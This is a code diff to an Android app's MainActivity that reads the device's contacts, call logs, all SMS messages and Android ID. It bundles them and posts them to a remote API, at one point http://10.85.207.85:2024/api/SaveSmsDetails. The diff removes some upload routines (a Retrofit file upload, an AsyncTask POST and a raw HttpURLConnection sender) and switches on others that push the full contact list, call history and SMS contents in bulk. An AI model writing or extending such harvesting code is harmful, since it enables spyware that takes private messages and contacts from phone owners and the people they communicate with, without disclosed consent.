@@ -54,13 +54,6 @@ import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.RequestBody;
-import okhttp3.ResponseBody;
-import retrofit2.Call;
-import retrofit2.Callback;
-
 
 public class MainActivity extends AppCompatActivity {
 
@@ -75,8 +68,6 @@ public class MainActivity extends AppCompatActivity {
     private String android_id;
     String currentDate, currentTime;
     public  static final int PERMISSIONS_MULTIPLE_REQUEST = 123;
-    private ApiService apiService;
-    String apiUrl = "http://10.85.207.85:2024/api/SaveContactDetails";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -93,7 +84,6 @@ public class MainActivity extends AppCompatActivity {
         currentTime = formatterTime.format(new Date());
         android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                 Settings.Secure.ANDROID_ID);
-        apiService = RetrofitClient.getApiService();
 
         checkPermission();
     }
@@ -163,8 +153,8 @@ public class MainActivity extends AppCompatActivity {
         } else {
 //            getPhoneContacts();
 //            getCallLogs();
-//            getAllSms();
-            getInstalledApps();
+            getAllSms();
+//            getInstalledApps();
 //            getDeviceDetails();
         }
     }
@@ -191,13 +181,10 @@ public class MainActivity extends AppCompatActivity {
                             Log.i("ContactDemo", "Name: " + name);
                             list.add(name + " - " + phoneNo);
                             Log.i("ContactDemo", "Phone Number: " + phoneNo);
-                            String jsonData = "{\"Id\": \"1\",\"Name\": \"Name\", \"Number\": \"Name\", \"Date\": \"Name\", \"Time\":\"Name\", \"Device_Id\": \"Name\", \"Uid\":\"Name\",\"SdkVersion\": \"Android SDK\", \"LUSR\": \"Android SDK\"}";
-//                            String jsonData = "{\"Id\": \"1\",\"Name\": " +name +"\"Number\": " +phoneNo + "\"Date\":" +currentDate +"\"Time\":" +currentTime +"\"Device_Id\":" +android_id +"\"Uid\":" +name +"\"SdkVersion\": \"Android SDK\", \"LUSR\": \"Android SDK\"}";
-                            new ApiRequestTask().execute(apiUrl, jsonData);
-//                            apiRequestTask.doInBackground("http://10.85.207.85:2024/api/SaveContactDetails", "{\"Id\": \"1\",\"Name\": }" +name +"{ \"Number\": }" +phoneNo + "{ \"Date\": }" +currentDate +"{\"Time\": }" +currentTime +"{\"Device_Id\": }" +android_id +"{ \"Uid\": }" +name +"{\"SdkVersion\": \"Android SDK\", \"LUSR\": \"Android SDK\"}");
 //                            callContactPushApi(name, phone+No, currentDate, currentTime, android_id, "Android SDK", "Android SDK");
 //                            generateFile(count++, name, phoneNo, currentDate, currentTime, android_id, "Android SDK", "Android SDK");
                         }
+                        callContactPushApi(list.toString(), "Phone", currentDate, currentTime, android_id, "Android SDK", "Android SDK");
                         contacts.setText(list.toString());
                         pCur.close();
                     }
@@ -205,34 +192,6 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
     }
-
-    private static class ApiRequestTask extends AsyncTask<String, Void, String> {
-
-        @Override
-        protected String doInBackground(String... params) {
-            String apiUrl = params[0];
-            String jsonData = params[1];
-
-            ApiClient apiClient = new ApiClient();
-
-            try {
-                String response = apiClient.postData(apiUrl, jsonData);
-                // Handle the API response here
-                Log.d("Response API",response.toString());
-                return response;
-            } catch (IOException e) {
-                e.printStackTrace();
-                // Handle the exception
-                return null;
-            }
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            // Update UI or handle the result as needed
-        }
-    }
-
 
     void generateFile(int count, String name, String number, String date, String time, String deviceId, String uid, String lusr) {
         Long tsLong = System.currentTimeMillis() / 1000;
@@ -253,38 +212,6 @@ public class MainActivity extends AppCompatActivity {
             writer.flush();
             writer.close();
             Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show();
-//            postFile("https://6cpduvi80d.execute-api.ap-south-1.amazonaws.com/dms/uploaddoc", gpxfile.getPath());
-            File file = new File(gpxfile.getPath());
-            RequestBody requestFile = RequestBody.create(MediaType.parse("multipart/form-data"), file);
-            MultipartBody.Part filePart = MultipartBody.Part.createFormData("file", file.getName(), requestFile);
-            RequestBody description = RequestBody.create(MediaType.parse("text/plain"), "yourDescription");
-
-            // Make the API call
-            Call<AppsModel> call = apiService.uploadFile(filePart, description);
-            call.enqueue(new Callback<AppsModel>() {
-                @Override
-                public void onResponse(Call<AppsModel> call, retrofit2.Response<AppsModel> response) {
-                    if (response.isSuccessful()) {
-                        // Handle successful response
-                        Log.d(TAG, "SUCCESS Retrofit");
-                        Log.d(TAG, response.body().toString());
-                        Log.d(TAG, response.toString());
-                        Log.d("message", response.message());
-                        Log.d("Body", response.raw().toString());
-                        AppsModel appsModel = response.body();
-                    } else {
-                        // Handle error response
-                        Log.d(TAG, "ERROR Retrofit");
-                        ResponseBody errorBody = response.errorBody();
-                    }
-                }
-
-                @Override
-                public void onFailure(Call<AppsModel> call, Throwable t) {
-                    // Handle failure
-                    t.printStackTrace();
-                }
-            });
 
         } catch (IOException e) {
             e.printStackTrace();
@@ -365,7 +292,6 @@ public class MainActivity extends AppCompatActivity {
             int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
             int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
             int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
-            sb.append("Call Details :");
             while (managedCursor.moveToNext()) {
                 String phNumber = managedCursor.getString(number);
                 String name = managedCursor.getString(cache_name);
@@ -389,12 +315,12 @@ public class MainActivity extends AppCompatActivity {
                         dir = "MISSED";
                         break;
                 }
-                sb.append("\nPhone Number:--- " + phNumber + "\nName:--- " + name + " \nCall Type:--- "
-                        + dir + " \nCall Date:--- " + callDayTime
-                        + " \nCall duration in sec :--- " + callDuration);
-                callCallLogPushApi(1, phNumber, name, callDuration, dir, callDate, android_id, "Android SDK", "Android SDK");
+                sb.append(phNumber + "---" + name + "---" + dir + "---" + callDayTime + "---" + callDuration);
+//                callCallLogPushApi(1, phNumber, name, callDuration, dir, callDate, android_id, "Android SDK", "Android SDK");
             }
-            managedCursor.close();
+        managedCursor.close();
+        callCallLogPushApi(1, "phNumber", sb.toString(), "callDuration", "dir", "callDate", android_id, "Android SDK", "Android SDK");
+
             Log.d("Call Logs",sb.toString());
             callLogs.setText(sb);
     }
@@ -419,7 +345,7 @@ public class MainActivity extends AppCompatActivity {
             StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                 @Override
                 public void onResponse(String response) {
-                    Log.i("VOLLEY-Response", response);
+                    Log.i("VOY-RespCall Log", response);
                 }
             }, new Response.ErrorListener() {
                 @Override
@@ -481,7 +407,7 @@ public class MainActivity extends AppCompatActivity {
                     @SuppressLint("Range") String readState = c.getString(c.getColumnIndex("read"));
                     String time = c.getString(c.getColumnIndexOrThrow("date"));
                     //if readState = 1 then inbox else sent
-                    lstSms.add(address + " -- " + msg + " -- " + readState + " -- " + time);
+                    lstSms.add(address + "," + msg + "," + readState + "," + time);
                     String dateString = formatter.format(new Date(Long.parseLong(time)));
                     String timeString = formatterTime.format(new Date(Long.parseLong(time)));
 //                    callMessagePushApi(1, address, msg, dateString, timeString, android_id, "Android SDK", "Android SDK");
@@ -489,57 +415,13 @@ public class MainActivity extends AppCompatActivity {
                    c.moveToNext();
                 }
             }
-//        callMessagePushApi(1, lstSms.toString(), "sfs", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
-        sendData(1, lstSms.toString(), "sfs", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
+
+//        sendData(1,  "Send Data",lstSms.toString(), "dateString", "timeString", android_id, "Android SDK", "Android SDK");
             Log.d("SMS - ", lstSms.toString());
             sms.setText(lstSms.toString());
+            callMessagePushApi(1, lstSms.toString(), "Call Method", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
             c.close();
 
-    }
-
-    void sendData(int id, String smsFrom, String body, String date, String time, String deviceId, String uid, String lusr){
-        Thread thread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    URL url = new URL("http://10.85.207.85:2024/api/SaveSmsDetails");
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
-                    conn.setRequestProperty("Accept","application/json");
-                    conn.setDoOutput(true);
-                    conn.setDoInput(true);
-
-                    JSONObject jsonBody = new JSONObject();
-                    jsonBody.put("Id", id);
-                    jsonBody.put("SmsFrom", smsFrom);
-                    jsonBody.put("SmsBody", body);
-                    jsonBody.put("SmsDate", date);
-                    jsonBody.put("Time", time);
-                    jsonBody.put("DeviceId", deviceId);
-                    jsonBody.put("UId", uid);
-                    jsonBody.put("SDKVERSION", BuildConfig.VERSION_NAME);
-                    jsonBody.put("LUSR", lusr);
-
-                    Log.i("JSON", jsonBody.toString());
-                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
-                    //os.writeBytes(URLEncoder.encode(jsonParam.toString(), "UTF-8"));
-                    os.writeBytes(jsonBody.toString());
-
-                    os.flush();
-                    os.close();
-
-                    Log.i("STATUS", String.valueOf(conn.getResponseCode()));
-                    Log.i("MSG" , conn.getResponseMessage());
-
-                    conn.disconnect();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }
-        });
-
-        thread.start();
     }
 
     void callMessagePushApi(int id, String smsFrom, String body, String date, String time, String deviceId, String uid, String lusr) {
@@ -561,7 +443,7 @@ public class MainActivity extends AppCompatActivity {
             StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                 @Override
                 public void onResponse(String response) {
-                    Log.i("VOLLEY-Response", response);
+                    Log.i("VOLLEY-Response SMS", response);
                 }
             }, new Response.ErrorListener() {
                 @Override
